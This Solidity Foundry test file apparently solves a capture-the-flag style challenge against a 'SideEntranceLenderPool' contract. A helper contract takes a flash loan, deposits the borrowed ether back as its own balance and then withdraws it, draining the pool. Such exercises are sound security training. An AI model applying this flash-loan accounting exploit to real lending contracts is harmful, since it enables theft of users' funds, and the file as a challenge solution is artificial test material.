// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/3/SideEntranceLenderPool.sol";


contract Executor is IFlashLoanEtherReceiver {

    address owner;
    SideEntranceLenderPool pool;
    constructor(SideEntranceLenderPool _pool) {
        owner = msg.sender;
        pool = _pool;
    }
    function execute() external payable {
        pool.deposit{value: 1000 ether}();
    }

    receive() external payable {}
}

contract SideEntranceLenderPoolTest is Test {
    using Address for address;
    uint TOKENS_IN_POOL = 1000000 ether;
    uint INITIAL_ATTACKER_TOKEN_BALANCE = 100 ether;
    SideEntranceLenderPool pool;
    Executor executor;
    address attacker;
    address someUser;
    function setUp() external {
        attacker = vm.addr(1);
        vm.deal(attacker, 1000 ether);
        // setup contracts
        pool = new SideEntranceLenderPool();
        executor = new Executor(pool);
        vm.deal(address(pool), 1000 ether);
    }
    
    function testComplete() external {
        vm.prank(address(pool));
        pool.deposit{value: 1000 ether}();

        vm.startPrank(address(executor));
        emit log_named_uint("pool balance", address(pool).balance);
        pool.flashLoan(1000 ether);

        pool.withdraw();
        emit log_named_uint("pool balance", address(pool).balance);
    }
}
